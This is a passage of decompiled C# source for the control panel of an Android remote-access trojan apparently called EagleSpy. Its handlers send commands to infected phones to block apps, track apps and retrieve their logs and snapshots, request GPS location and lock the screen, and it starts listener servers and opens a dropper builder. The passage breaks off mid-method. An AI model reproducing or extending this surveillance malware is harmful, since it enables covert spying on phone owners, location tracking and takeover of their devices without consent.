			if (this.ClientsWindow.Rows.Count <= 0 || this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (this.DGFW.Rows.Count != 0)
			{
				if (this.DGFW.SelectedRows.Count == 0)
				{
					EagleAlert.Showinformation("Select app first");
					return;
				}
				if (Operators.CompareString(this.DGFW.SelectedRows[0].Cells[2].Value.ToString(), "Allowed", false) == 0)
				{
					EagleAlert.Showinformation("Select app is not Blocked.");
					return;
				}
				string text = this.DGFW.SelectedRows[0].Cells[3].Value.ToString();
				string[] array = client.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"FW<*>A>",
						text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(array2);
			}
		}

		// Token: 0x06000515 RID: 1301 RVA: 0x00066F74 File Offset: 0x00065174
		private void ToolStripMenuItem15_Click_1(object sender, EventArgs e)
		{
			if (this.ClientsWindow.Rows.Count <= 0 || this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (this.DGFW.Rows.Count != 0)
			{
				if (this.DGFW.SelectedRows.Count == 0)
				{
					EagleAlert.Showinformation("Select app first");
					return;
				}
				if (Operators.CompareString(this.DGFW.SelectedRows[0].Cells[2].Value.ToString(), "Allowed", false) != 0)
				{
					EagleAlert.Showinformation("Select app is already Blocked.");
					return;
				}
				string text = this.DGFW.SelectedRows[0].Cells[3].Value.ToString();
				string[] array = client.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"FW<*>B>",
						text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(array2);
			}
		}

		// Token: 0x06000516 RID: 1302 RVA: 0x00002423 File Offset: 0x00000623
		private void DrakeUIAvatar10_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000517 RID: 1303 RVA: 0x00003892 File Offset: 0x00001A92
		private void DrakeUIButtonIcon16_Click(object sender, EventArgs e)
		{
			this.TRKPANEL.BringToFront();
		}

		// Token: 0x06000518 RID: 1304 RVA: 0x0000389F File Offset: 0x00001A9F
		private void DrakeUIButtonIcon14_Click_1(object sender, EventArgs e)
		{
			this.FWPANEL.BringToFront();
		}

		// Token: 0x06000519 RID: 1305 RVA: 0x00067150 File Offset: 0x00065350
		private void DrakeUIAvatar11_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.Rows.Count > 0 && this.ClientsWindow.SelectedRows.Count > 0)
			{
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				string[] array = client.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"MO<*>L",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(array2);
			}
		}

		// Token: 0x0600051A RID: 1306 RVA: 0x00067294 File Offset: 0x00065494
		private void ToolStripMenuItem20_Click(object sender, EventArgs e)
		{
			if (this.DGVTRK.Rows.Count > 0 && this.DGVTRK.SelectedRows.Count > 0)
			{
				string text = this.DGVTRK.SelectedRows[0].Cells[3].Value.ToString();
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				string[] array = client.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"MO<*>S>",
						text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(array2);
			}
		}

		// Token: 0x0600051B RID: 1307 RVA: 0x000038AC File Offset: 0x00001AAC
		private void DrakeUIButtonIcon20_Click(object sender, EventArgs e)
		{
			this.recordsShowpanel.SendToBack();
			this.recordshowtext.Text = "";
		}

		// Token: 0x0600051C RID: 1308 RVA: 0x00067404 File Offset: 0x00065604
		private void ToolStripMenuItem21_Click(object sender, EventArgs e)
		{
			if (this.DGVTRK.Rows.Count > 0 && this.DGVTRK.SelectedRows.Count > 0)
			{
				if (Operators.CompareString(this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", false) == 0)
				{
					Codes.MyMsgBox("Alert", "this app is not installed on this phone.", false, Resources.error48px);
					return;
				}
				if (Operators.CompareString(this.DGVTRK.SelectedRows[0].Cells[2].Value.ToString(), "Yes", false) != 0)
				{
					Codes.MyMsgBox("Alert", "There are no logs for this app yet.", false, Resources.error48px);
					return;
				}
				string text = this.DGVTRK.SelectedRows[0].Cells[4].Value.ToString();
				this.recordshowtext.Text = text;
				this.recordsShowpanel.BringToFront();
			}
		}

		// Token: 0x0600051D RID: 1309 RVA: 0x00067510 File Offset: 0x00065710
		private void ToolStripMenuItem23_Click(object sender, EventArgs e)
		{
			if (this.DGVTRK.Rows.Count > 0 && this.DGVTRK.SelectedRows.Count > 0)
			{
				if (Operators.CompareString(this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", false) == 0)
				{
					Codes.MyMsgBox("Alert", "this app is not installed on this phone.", false, Resources.error48px);
					return;
				}
				string text = this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				string[] array = client.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"MO<*>R>",
						text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(array2);
			}
		}

		// Token: 0x0600051E RID: 1310 RVA: 0x000676C8 File Offset: 0x000658C8
		private void ToolStripMenuItem19_Click(object sender, EventArgs e)
		{
			if (this.DGVTRK.Rows.Count > 0 && this.DGVTRK.SelectedRows.Count > 0)
			{
				if (Operators.CompareString(this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", false) == 0)
				{
					Codes.MyMsgBox("Alert", "this app is not installed on this phone.", false, Resources.error48px);
					return;
				}
				if ((this.combodatestrack.Items == null) | string.IsNullOrEmpty(this.combodatestrack.Text))
				{
					Codes.MyMsgBox("Alert", "Select Snaps Date.", false, Resources.error48px);
					return;
				}
				string text = this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				string[] array = client.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"MO<*>G>",
						text,
						">",
						client.ClientRemoteAddress,
						">",
						this.combodatestrack.Text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(array2);
			}
		}

		// Token: 0x0600051F RID: 1311 RVA: 0x000678E4 File Offset: 0x00065AE4
		private void ToolStripMenuItem24_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.Rows.Count <= 0 || this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			Dialog1 dialog = new Dialog1();
			dialog.Title = "Enter App ID";
			dialog.ShowDialog();
			if (dialog.DialogResult == DialogResult.OK)
			{
				string text = dialog.Mytext.Text;
				if (Codes.IsValidPackageName(text) || Codes.MyMsgBox("Alert", "this new ID is not valid as app id\r\nare you sure you want to continue ?", true, Resources.error48px))
				{
					Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
					string[] array = client.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						client.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"MO<*>A>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							client.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(array2);
				}
			}
		}

		// Token: 0x06000520 RID: 1312 RVA: 0x00067A7C File Offset: 0x00065C7C
		private void ToolStripMenuItem22_Click(object sender, EventArgs e)
		{
			if (this.DGVTRK.Rows.Count > 0 && this.DGVTRK.SelectedRows.Count > 0)
			{
				if (Operators.CompareString(this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", false) == 0)
				{
					Codes.MyMsgBox("Alert", "this app is not installed on this phone.", false, Resources.error48px);
					return;
				}
				if ((this.combodatestrack.Items == null) | string.IsNullOrEmpty(this.combodatestrack.Text))
				{
					Codes.MyMsgBox("Alert", "Select Snaps Date.", false, Resources.error48px);
					return;
				}
				string text = this.DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				string[] array = client.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"MO<*>D>",
						text,
						">",
						this.combodatestrack.Text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(array2);
			}
		}

		// Token: 0x06000521 RID: 1313 RVA: 0x00067C84 File Offset: 0x00065E84
		private void ToolStripMenuItem25_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.Rows.Count <= 0 || this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (this.DGFW.Rows.Count != 0)
			{
				if (this.DGFW.SelectedRows.Count == 0)
				{
					EagleAlert.Showinformation("Select app first");
					return;
				}
				string text = this.DGFW.SelectedRows[0].Cells[3].Value.ToString();
				string[] array = client.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"MO<*>A>",
						text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(array2);
			}
		}

		// Token: 0x06000522 RID: 1314 RVA: 0x00067E20 File Offset: 0x00066020
		private void DGVSERVS_CellClick(object sender, DataGridViewCellEventArgs e)
		{
			if (e.ColumnIndex != 0 || e.RowIndex < 0)
			{
				return;
			}
			string text = this.DGVSERVS.Rows[e.RowIndex].Cells[e.ColumnIndex].Tag.ToString();
			this.DGVSERVS.ClearSelection();
			this.DGVSERVS.CurrentCell = this.DGVSERVS.Rows[e.RowIndex].Cells[0];
			this.DGVSERVS.Rows[e.RowIndex].Selected = true;
			if (Operators.CompareString(text, "OFF", false) == 0)
			{
				EagleSpyMain._Closure_0024__210_002D0 closure_0024__210_002D = null;
				EagleSpyMain._Closure_0024__210_002D0 CS_0024_003C_003E8__locals0 = new EagleSpyMain._Closure_0024__210_002D0(closure_0024__210_002D);
				CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
				string text2 = Application.StartupPath + "\\res\\Config\\Pass.inf";
				CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber = Conversions.ToString(this.DGVSERVS.SelectedRows[0].Tag);
				int num = Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber);
				DataGridViewRow dataGridViewRow = this.DGVSERVS.SelectedRows[0];
				if (dataGridViewRow != null)
				{
					string text3 = dataGridViewRow.Cells[1].Value.ToString();
					bool flag = false;
					foreach (Accept accept in this.server)
					{
						if (Operators.CompareString(accept.Myport, text3, false) == 0)
						{
							flag = true;
							break;
						}
					}
					if (flag)
					{
						EagleAlert.Showinformation("this port is already active");
						return;
					}
				}
				if (!Codes.CheckPort(num))
				{
					Codes.MyMsgBox("Port in use", "this port:" + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + "  is used by another program.", false, Resources.warning48px);
					return;
				}
				if (!File.Exists(text2))
				{
					File.WriteAllText(text2, Codes.Encrypt("X0X0X", Data.THEKEY));
				}
				string[] array = File.ReadAllLines(text2);
				if (Operators.CompareString(this.passtxt.Text, Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY), false) != 0)
				{
					if (this.passtxt.Text.Length > 3)
					{
						string text4 = File.ReadAllText(text2);
						text4 = text4.Replace(array.GetValue(0).ToString(), Codes.Encrypt(this.passtxt.Text, Data.THEKEY));
						File.WriteAllText(text2, text4);
					}
					else if (this.passtxt.Text.Length < 4)
					{
						Codes.MyMsgBox("Warning", "Password Shoud be more Than 3 chars", false, Resources.warning48px);
						return;
					}
				}
				try
				{
					array = File.ReadAllLines(text2);
					if (array.GetValue(0).ToString().Length < 3)
					{
						File.WriteAllText(text2, Codes.Encrypt("X0X0X", Data.THEKEY));
						Data.password = Codes.AES_Decrypt(Codes.Encrypt("X0X0X", Data.THEKEY), Data.THEKEY);
					}
					else
					{
						Data.password = Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY);
					}
					new Thread(delegate
					{
						CS_0024_003C_003E8__locals0._0024VB_0024Me.server.Add(new Accept(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber));
					})
					{
						IsBackground = true
					}.Start();
					this.DGVSERVS.SelectedRows[0].Cells[0].Value = Resources.swtchon;
					this.DGVSERVS.SelectedRows[0].Cells[0].Tag = "ON";
					this.DGVSERVS.SelectedRows[0].Cells[2].Value = "ON";
					this.DGVSERVS.SelectedRows[0].Cells[2].Style.ForeColor = Color.Lime;
					EagleAlert.ShowSucess("Server Start on " + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + " Successfully");
					return;
				}
				catch (Exception ex)
				{
					return;
				}
			}
			DataGridViewRow dataGridViewRow2 = this.DGVSERVS.SelectedRows[0];
			if (dataGridViewRow2 == null)
			{
				return;
			}
			string text5 = dataGridViewRow2.Cells[1].Value.ToString();
			Accept accept2 = null;
			foreach (Accept accept3 in this.server)
			{
				if (Operators.CompareString(accept3.Myport, text5, false) == 0)
				{
					accept3.MainListner.Server.Close();
					accept3.MainListner.Server.Dispose();
					accept3.MainListner.Stop();
					dataGridViewRow2.Cells[0].Value = Resources.swtchoff;
					dataGridViewRow2.Cells[0].Tag = "OFF";
					dataGridViewRow2.Cells[2].Value = "OFF";
					dataGridViewRow2.Cells[2].Style.ForeColor = Color.Red;
					this.PORTs.Replace(text5 + ">", "");
					accept2 = accept3;
					break;
				}
			}
			if (accept2 != null)
			{
				this.server.Remove(accept2);
				accept2 = null;
			}
		}

		// Token: 0x06000523 RID: 1315 RVA: 0x000683C0 File Offset: 0x000665C0
		private void Startserver(DataGridViewCellEventArgs e)
		{
			if (e.ColumnIndex != 0 || e.RowIndex < 0)
			{
				return;
			}
			string text = this.DGVSERVS.Rows[e.RowIndex].Cells[e.ColumnIndex].Tag.ToString();
			this.DGVSERVS.ClearSelection();
			this.DGVSERVS.CurrentCell = this.DGVSERVS.Rows[e.RowIndex].Cells[0];
			this.DGVSERVS.Rows[e.RowIndex].Selected = true;
			if (Operators.CompareString(text, "OFF", false) == 0)
			{
				EagleSpyMain._Closure_0024__210_002D0 closure_0024__210_002D = null;
				EagleSpyMain._Closure_0024__210_002D0 CS_0024_003C_003E8__locals0 = new EagleSpyMain._Closure_0024__210_002D0(closure_0024__210_002D);
				CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
				string text2 = Application.StartupPath + "\\res\\Config\\Pass.inf";
				CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber = Conversions.ToString(this.DGVSERVS.SelectedRows[0].Tag);
				int num = Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber);
				DataGridViewRow dataGridViewRow = this.DGVSERVS.SelectedRows[0];
				if (dataGridViewRow != null)
				{
					string text3 = dataGridViewRow.Cells[1].Value.ToString();
					bool flag = false;
					foreach (Accept accept in this.server)
					{
						if (Operators.CompareString(accept.Myport, text3, false) == 0)
						{
							flag = true;
							break;
						}
					}
					if (flag)
					{
						EagleAlert.Showinformation("this port is already active");
						return;
					}
				}
				if (!Codes.CheckPort(num))
				{
					Codes.MyMsgBox("Port in use", "this port:" + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + "  is used by another program.", false, Resources.warning48px);
					return;
				}
				if (!File.Exists(text2))
				{
					File.WriteAllText(text2, Codes.Encrypt("X0X0X", Data.THEKEY));
				}
				string[] array = File.ReadAllLines(text2);
				if (Operators.CompareString(this.passtxt.Text, Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY), false) != 0)
				{
					if (this.passtxt.Text.Length > 3)
					{
						string text4 = File.ReadAllText(text2);
						text4 = text4.Replace(array.GetValue(0).ToString(), Codes.Encrypt(this.passtxt.Text, Data.THEKEY));
						File.WriteAllText(text2, text4);
					}
					else if (this.passtxt.Text.Length < 4)
					{
						Codes.MyMsgBox("Warning", "Password Shoud be more Than 3 chars", false, Resources.warning48px);
						return;
					}
				}
				try
				{
					array = File.ReadAllLines(text2);
					if (array.GetValue(0).ToString().Length < 3)
					{
						File.WriteAllText(text2, Codes.Encrypt("X0X0X", Data.THEKEY));
						Data.password = Codes.AES_Decrypt(Codes.Encrypt("X0X0X", Data.THEKEY), Data.THEKEY);
					}
					else
					{
						Data.password = Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY);
					}
					new Thread(delegate
					{
						CS_0024_003C_003E8__locals0._0024VB_0024Me.server.Add(new Accept(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber));
					})
					{
						IsBackground = true
					}.Start();
					this.DGVSERVS.SelectedRows[0].Cells[0].Value = Eagle_Spy_Resources.close48px;
					this.DGVSERVS.SelectedRows[0].Cells[0].Tag = "ON";
					this.DGVSERVS.SelectedRows[0].Cells[2].Value = "ON";
					this.DGVSERVS.SelectedRows[0].Cells[2].Style.ForeColor = Color.Lime;
					EagleAlert.ShowSucess("Server Start on " + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + " Successfully");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
			DataGridViewRow dataGridViewRow2 = this.DGVSERVS.SelectedRows[0];
			if (dataGridViewRow2 == null)
			{
				return;
			}
			string text5 = dataGridViewRow2.Cells[1].Value.ToString();
			Accept accept2 = null;
			foreach (Accept accept3 in this.server)
			{
				if (Operators.CompareString(accept3.Myport, text5, false) == 0)
				{
					accept3.MainListner.Server.Close();
					accept3.MainListner.Server.Dispose();
					accept3.MainListner.Stop();
					dataGridViewRow2.Cells[0].Value = Eagle_Spy_Resources.Abov_mid;
					dataGridViewRow2.Cells[0].Tag = "OFF";
					dataGridViewRow2.Cells[2].Value = "OFF";
					dataGridViewRow2.Cells[2].Style.ForeColor = Color.Red;
					this.PORTs.Replace(text5 + ">", "");
					accept2 = accept3;
					break;
				}
			}
			if (accept2 != null)
			{
				this.server.Remove(accept2);
				accept2 = null;
			}
		}

		// Token: 0x06000524 RID: 1316 RVA: 0x00068954 File Offset: 0x00066B54
		private void Droperbtn_Click(object sender, EventArgs e)
		{
			if (this.DR == null)
			{
				this.DR = new Drooper();
				DialogResult dialogResult = this.DR.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.DR.Close();
					this.DR = null;
					return;
				}
				this.DR.Close();
				this.DR = null;
			}
		}

		// Token: 0x06000525 RID: 1317 RVA: 0x000689AC File Offset: 0x00066BAC
		private void ClientsWindow_CellEndEdit(object sender, DataGridViewCellEventArgs e)
		{
			int width = this.ClientsWindow.Width;
			int height = this.ClientsWindow.Height;
			int num = 0;
			checked
			{
				int num2 = this.ClientsWindow.Columns.Count - 1;
				for (int i = 0; i <= num2; i++)
				{
					num += this.ClientsWindow.Columns[i].Width;
				}
				num += 50;
				this.ClientsWindow.Size = new Size(num, height);
				this.ClientsWindow.Width = num;
				int width2 = this.ClientsWindow.Width;
				int num3 = width2 - width;
				this.DashboardPanel.Width += num3;
			}
		}

		// Token: 0x06000526 RID: 1318 RVA: 0x00068A5C File Offset: 0x00066C5C
		private void Satustimer_Tick(object sender, EventArgs e)
		{
			try
			{
				if (this.ClientsWindow.Rows.Count > 0)
				{
					if (this.ClientsWindow.SelectedRows.Count > 0)
					{
						Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
						string[] array = client.Keys.Split(new char[] { ':' });
						if ((client == null) | !client.isconnected)
						{
							this.TCavatar.Image = null;
							this.label23.Text = "127.0.0.1:8080";
							this.label12.Text = "Null";
							this.uncheckbtn.Visible = false;
							this.clientfoldrbtn.Visible = false;
							this.MonitorPanel.Visible = false;
							this.FWstatus.ForeColor = Color.Red;
							this.DGFW.DataSource = null;
							this.DGVTRK.DataSource = null;
							this.combodatestrack.Items.Clear();
							this.combodatestrack.Text = "";
						}
						else
						{
							Bitmap bitmap = (Bitmap)client.Wallpaper.Clone();
							if (this.TCavatar.Image != null)
							{
								this.TCavatar.Image.Dispose();
							}
							this.TCavatar.Image = bitmap;
							this.label23.Text = client.ClientAddressIP + ":" + array[1];
							this.label12.Text = client.android + "~" + client.Phone_model;
							this.cip.Text = client.ClientAddressIP;
							this.cport.Text = array[1];
							this.phonemodel.Text = client.Phone_model;
							this.andv.Text = client.android;
							this.clitnm.Text = client.ClientName;
							this.ccountry.Text = client.Country;
							this.cflag.Image = client.Flag;
							this.cbattery.Text = client.BatteryCharge.Replace("f", "").Replace("t", "") + "%";
							this.idate.Text = client.installdate;
							this.uncheckbtn.Visible = true;
							this.clientfoldrbtn.Visible = true;
							client.Row.Cells[12].Value = client.ActiveNow;
							if (client.IsonVPN)
							{
								this.FWstatus.ForeColor = Color.Lime;
							}
							else
							{
								this.FWstatus.ForeColor = Color.Red;
							}
							if (client.FirewallTable != null && client.FirewallTable.Rows.Count > 0)
							{
								this.DGFW.DataSource = client.FirewallTable;
							}
							if (client.TrackedAppsTable != null)
							{
								if (client.TrackedAppsTable.Rows.Count > 0)
								{
									this.DGVTRK.DataSource = client.TrackedAppsTable;
									this.DGVTRK.Columns[4].Visible = false;
								}
								if (client.TrackedDatesFounded != null && this.combodatestrack.Items != null && this.combodatestrack.Items.Count == 0 && client.TrackedDatesFounded.Length != 0)
								{
									string[] trackedDatesFounded = client.TrackedDatesFounded;
									string[] array2 = trackedDatesFounded;
									foreach (string text in array2)
									{
										this.combodatestrack.Items.Add(text);
									}
									this.combodatestrack.Text = Conversions.ToString(this.combodatestrack.Items[0]);
								}
							}
							this.MonitorPanel.Visible = true;
						}
					}
					else
					{
						this.TCavatar.Image = null;
						this.uncheckbtn.Visible = false;
						this.clientfoldrbtn.Visible = false;
						this.MonitorPanel.Visible = false;
						this.FWstatus.ForeColor = Color.Red;
						this.DGFW.DataSource = null;
						this.DGVTRK.DataSource = null;
						this.combodatestrack.Items.Clear();
						this.combodatestrack.Text = "";
					}
				}
				else
				{
					this.DGFW.DataSource = null;
					this.DGVTRK.DataSource = null;
					this.TCavatar.Image = null;
					this.uncheckbtn.Visible = false;
					this.clientfoldrbtn.Visible = false;
					this.MonitorPanel.Visible = false;
					this.FWstatus.ForeColor = Color.Red;
					this.combodatestrack.Items.Clear();
					this.combodatestrack.Text = "";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000529 RID: 1321 RVA: 0x00002423 File Offset: 0x00000623
		private void label16_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600052A RID: 1322 RVA: 0x00002423 File Offset: 0x00000623
		private void tipkey_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600052B RID: 1323 RVA: 0x00061C88 File Offset: 0x0005FE88
		private void drakeUIButtonIcon33_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.Account,
										Data.SPL_SOCKET,
										"account"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600052C RID: 1324 RVA: 0x00062A9C File Offset: 0x00060C9C
		private void GPS()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient3,
										Data.SPL_SOCKET,
										Data.SPL_DATA,
										Data.SPL_SOCKET,
										SecurityKey.getGPS
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600052D RID: 1325 RVA: 0x00086930 File Offset: 0x00084B30
		private void LOCKSCREEN()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"sp<*>LK",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
